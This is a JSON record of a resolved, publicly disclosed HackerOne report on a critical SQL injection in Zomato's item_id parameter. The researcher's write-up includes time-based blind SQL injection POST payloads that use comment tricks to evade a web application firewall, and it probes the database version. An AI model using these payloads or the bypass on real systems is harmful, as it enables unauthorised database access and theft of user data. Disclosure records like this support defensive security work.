{
  "id": 403616,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC80MDM2MTY=",
  "url": "https://hackerone.com/reports/403616",
  "title": "[www.zomato.com] SQLi - /php/██████████ - item_id",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "critical",
  "readable_substate": "Resolved",
  "created_at": "2018-08-31T19:50:43.729Z",
  "submitted_at": "2018-08-31T19:50:43.729Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "gerben_javado",
    "url": "/gerben_javado",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/nxCLVa5sJm5BsdGjBdqzDfg8/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 2943,
    "url": "https://hackerone.com/zomato",
    "handle": "zomato",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/002/943/71b47f9aa21166f0989dfb97112ca10c66a9d0b2_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/002/943/71b47f9aa21166f0989dfb97112ca10c66a9d0b2_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "Zomato",
      "twitter_handle": "Zomato",
      "website": "https://www.zomato.com",
      "about": "The fastest way to search for great places to eat at and order from around you. Serving 24 countries worldwide."
    }
  },
  "has_bounty?": true,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "no-content",
  "cve_ids": [],
  "singular_disclosure_disabled": true,
  "disclosed_at": "2018-09-11T05:04:45.002Z",
  "bug_reporter_agreed_on_going_public_at": "2018-09-08T12:00:32.389Z",
  "team_member_agreed_on_going_public_at": "2018-09-11T05:04:44.856Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "",
  "bounty_amount": "4500.0",
  "formatted_bounty": "$4,500",
  "weakness": {
    "id": 67,
    "name": "SQL Injection"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": null,
  "vote_count": 301,
  "voters": [
    "pajoda",
    "prathap_ilango",
    "libcontainer",
    "n1m0",
    "sp1d3rs",
    "cdl",
    "cache-money",
    "bogdantcaciuc",
    "kapytein",
    "bull",
    "and 291 more..."
  ],
  "severity": {
    "rating": "critical",
    "author_type": "User"
  },
  "structured_scope": {
    "databaseId": 383,
    "asset_type": "WILDCARD",
    "asset_identifier": "*.zomato.com",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "id": 10451,
      "category": "team",
      "content": "Thanks @gerben_javado for helping us keep @zomato secure :)",
      "user": {
        "id": 250599,
        "username": "prateek_0490-zomato",
        "name": "Prateek Tiwari",
        "bio": "",
        "cleared": false,
        "verified": false,
        "website": null,
        "location": "",
        "created_at": "2018-03-13T12:07:13.776Z",
        "url": "https://hackerone.com/prateek_0490-zomato",
        "hackerone_triager": false,
        "hackerone_employee": false,
        "user_type": "company",
        "profile_picture_urls": {
          "small": "https://profile-photos.hackerone-user-content.com/variants/CL56d6XwY4TN3eHc73df8AEU/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
          "medium": "https://profile-photos.hackerone-user-content.com/variants/CL56d6XwY4TN3eHc73df8AEU/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937",
          "xtralarge": "https://profile-photos.hackerone-user-content.com/variants/CL56d6XwY4TN3eHc73df8AEU/60f411638706d89ae3052af6fe8b88fa9a798e291deee40f6a22e81418d78d5f"
        }
      },
      "can_view?": true,
      "can_create?": false,
      "attachments": []
    },
    {
      "id": 10341,
      "category": "researcher",
      "content": "Thanks to the entire @Zomato team for doing this challenge. Its a pleasure to be back in the bug bounty game after a while.\n\n#Introduction\nSo I managed to find SQLi on `https://www.zomato.com/php/██████████` in the POST parameter item_id. Debugging and exploiting this issue was somewhat confusing in the beginning because there seems to be database caching going on based on the int value that is given. So for example when you submit item_id=1111-stuffthatchangeshere multiple times the payload won't work anymore. In order to circumvent this caching you need to increment or decrement the integer before the payload every request.\n\n# Exploitation\nI started of simple to really understand that we were dealing with a SQLi. The sleep command was the way for me to proof this and this worked quite easily using my previous discovered Akamai Kona Bypass:\n\n```\nPOST https://www.zomato.com/php/██████████\nBody: res_id=1111&method=add_menu_item_tags&item_id=1111-sleep/*f*/(10)&new_tags[]=3&menu_id=1111\n```\n\nFrom there I wanted to proof data extraction and came up with the following POC:\n\nResponse time: 6090ms\n```\nPOST https://www.zomato.com/php/██████████\nres_id=1111&method=add_menu_item_tags&item_id=1111-if(mid(version/*f*/(),1,1)=5,sleep/*f*/(5),0)&new_tags%5B%5D=3&menu_id=1111\n```\n\nResponse time: 910ms\n```\nPOST https://www.zomato.com/php/██████████\nres_id=1111&method=add_menu_item_tags&item_id=1111-if(mid(version/*f*/(),1,1)=4,sleep/*f*/(5),0)&new_tags%5B%5D=3&menu_id=1111\n```\n\nThis proofs that version() starts with a 5 and shows that we can extract data out of the database. At this point I stopped testing to write the report. Good luck fixing.\n\n#Impact\nFull database access holding private user information.",
      "user": {
        "id": 3237,
        "username": "gerben_javado",
        "name": "Gerben Janssen van Doorn",
        "bio": "",
        "cleared": false,
        "verified": false,
        "website": null,
        "location": "Netherlands",
        "created_at": "2014-03-03T08:27:25.416Z",
        "url": "https://hackerone.com/gerben_javado",
        "hackerone_triager": false,
        "hackerone_employee": false,
        "user_type": "hacker",
        "profile_picture_urls": {
          "small": "https://profile-photos.hackerone-user-content.com/variants/nxCLVa5sJm5BsdGjBdqzDfg8/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c",
          "medium": "https://profile-photos.hackerone-user-content.com/variants/nxCLVa5sJm5BsdGjBdqzDfg8/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc",
          "xtralarge": "https://profile-photos.hackerone-user-content.com/variants/nxCLVa5sJm5BsdGjBdqzDfg8/114764ec8f01b1a3e153599212c9f011fb3b0bce3a4fdc1f9a3c551f8c94acf8"
        }
      },
      "can_view?": true,
      "can_create?": false,
      "attachments": []
    }
  ]
}
